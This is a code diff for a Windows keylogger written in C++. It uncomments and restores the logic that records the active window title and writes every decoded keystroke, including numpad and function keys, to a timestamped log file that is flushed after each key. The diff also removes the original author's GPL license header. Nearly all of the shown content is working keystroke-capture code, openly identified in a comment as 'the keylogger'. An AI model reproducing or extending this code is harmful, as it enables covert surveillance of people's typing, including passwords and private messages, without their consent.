@@ -1,91 +1,73 @@
 #include "stdafx.h"
-/*
-	Keylogger
-	Created @ 02.02.2009
-	Copyright (C) 2009 Christian Mayer <http://fox21.at>
-	
-	This program is free software: you can redistribute it and/or modify
-	it under the terms of the GNU General Public License as published by
-	the Free Software Foundation, either version 3 of the License, or
-	(at your option) any later version.
-	
-	This program is distributed in the hope that it will be useful,
-	but WITHOUT ANY WARRANTY; without even the implied warranty of
-	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-	GNU General Public License for more details.
-	
-	You should have received a copy of the GNU General Public License
-	along with this program.  If not, see <http://www.gnu.org/licenses/>.
-*/
-
 
 #include "main.h"
 
-using namespace std;
-
 int main(int argc, char *argv[]){
-//	printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME, PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH, __DATE__, __TIME__);
-//	puts(PROJECT_COPYRIGHT);
-//	puts("");
-//	
-//	
-//	string basepath = dirBasename(getSelfPath());
-//	
-//	time_t rawtime;
-//	struct tm timeinfo;
-//	time(&rawtime);
-//	localtime_s(&timeinfo, &rawtime);
-//	char filename[MAX_PATH];
-//	char filepath[MAX_PATH];
-//	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", &timeinfo);
-//	//sprintf(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
-//	sprintf_s(filepath, MAX_PATH, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
-//	
-//	//printf("filepath '%s'\n", filepath); exit(0);
-//	
-//	
-//	string lastTitle = "";
-//	ofstream klogout(filepath);
-//	
-//	//SHORT lastc = 0;
-//	while(1){
-//		Sleep(2); // give other programs time to run
-//		
-//		// get the active windowtitle
-//		char title[1024];
-//		wchar_t title_wchar[1024];
-//		HWND hwndHandle = GetForegroundWindow();
-//		GetWindowText(hwndHandle, title_wchar, 1023);
-//
-//		//memcpy(title, title_wchar, 1024); // title_wchar do title
-		//wcstombs(title, title_wchar, 1024);
-//
-//		if(lastTitle != title){
-//			klogout << endl << endl << "Window: ";
-//#ifdef DEBUG
-//			cout << endl << endl << "Window: ";
-//#endif
-//			if(strlen(title) == 0){
-//				klogout << "NO ACTIVE WINDOW";
-//#ifdef DEBUG
-//				cout << "NO ACTIVE WINDOW";
-//#endif
-//			}
-//			else{
-//				klogout << "'" << title << "'";
-//#ifdef DEBUG
-//				cout << "'" << title << "'";
-//#endif
-//			}
-//			klogout << endl;
-//#ifdef DEBUG
-//			cout << endl;
-//#endif
-//			
-//			lastTitle = title;
-//		}
-	while (1)
+	printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME, PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH, __DATE__, __TIME__);
+	puts(PROJECT_COPYRIGHT);
+	puts("");
+	
+	
+	std::string basepath = dirBasename(getSelfPath());
+	
+	time_t rawtime;
+	struct tm timeinfo;
+	time(&rawtime);
+	localtime_s(&timeinfo, &rawtime);
+	char filename[MAX_PATH];
+	char filepath[MAX_PATH];
+	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", &timeinfo);
+	//sprintf(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
+	sprintf_s(filepath, MAX_PATH, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
+	
+	//printf("filepath '%s'\n", filepath); exit(0);
+	
+	
+	std::string lastTitle = "";
+	std::ofstream klogout(filepath);
+	
+	//SHORT lastc = 0;
+	while(1)
 	{
+		Sleep(2); // give other programs time to run
+		
+		// get the active windowtitle
+		char title[1024];
+		wchar_t title_wchar[1024];
+		HWND hwndHandle = GetForegroundWindow();
+		GetWindowText(hwndHandle, title_wchar, 1023);
+
+		size_t pReturnValue;
+		wcstombs_s(&pReturnValue, title, MAX_PATH, title_wchar, MAX_PATH);
+
+
+		if(lastTitle != title)
+		{
+			klogout << std::endl << std::endl << "Window: ";
+#ifdef DEBUG
+			std::cout << std::endl << std::endl << "Window: ";
+#endif
+			if(strlen(title) == 0)
+			{
+				klogout << "NO ACTIVE WINDOW";
+#ifdef DEBUG
+				std::cout << "NO ACTIVE WINDOW";
+#endif
+			}
+			else
+			{
+				klogout << "'" << title << "'";
+#ifdef DEBUG
+				std::cout << "'" << title << "'";
+#endif
+			}
+			klogout << std::endl;
+#ifdef DEBUG
+			std::cout << std::endl;
+#endif
+			
+			lastTitle = title;
+		}
 		// logging keys, thats the keylogger
 		for (unsigned char c = 1; c < 255; c++)
 		{
@@ -144,8 +126,8 @@ int main(int argc, char *argv[]){
 
 				else if (c == 91 || c == 92)
 					out = "[WIN]";
-				//else if (c >= 96 && c <= 105)
-					//out = "[NUM " + intToString(c - 96) + "]";
+				else if (c >= 96 && c <= 105)
+					out = "[NUM " + intToString(c - 96) + "]";
 				else if (c == 106)
 					out = "[NUM /]";
 				else if (c == 107)
@@ -154,8 +136,8 @@ int main(int argc, char *argv[]){
 					out = "[NUM -]";
 				else if (c == 109)
 					out = "[NUM ,]";
-				//else if (c >= 112 && c <= 123)
-					//out = "[F" + intToString(c - 111) + "]";
+				else if (c >= 112 && c <= 123)
+					out = "[F" + intToString(c - 111) + "]";
 				else if (c == 144)
 					out = "[NUM]";
 				else if (c == 192)
@@ -177,26 +159,23 @@ int main(int argc, char *argv[]){
 				else if (c == 226)
 					out = "<";
 
-				//else
-					//out = "[KEY \\" + intToString(c) + "]";
+				else
+					out = "[KEY \\" + intToString(c) + "]";
 				std::cout << "OUT = " << out << "\n";
+				
+#ifdef DEBUG
+				std::cout << ">" << out << "< (" << (unsigned)c << ")" << std::endl;
+#endif
+				klogout << out;
+				klogout.flush();
+				
+				//lastc = c;
 			}
 		}
+		
 	}
-				
-//#ifdef DEBUG
-//				cout << ">" << out << "< (" << (unsigned)c << ")" << endl;
-//#endif
-//				klogout << out;
-//				klogout.flush();
-//				
-//				//lastc = c;
-//			}
-//		}
-//		
-//	}
-//	
-//	klogout.close();
+	
+	klogout.close();
 	
 	return 0;
 }
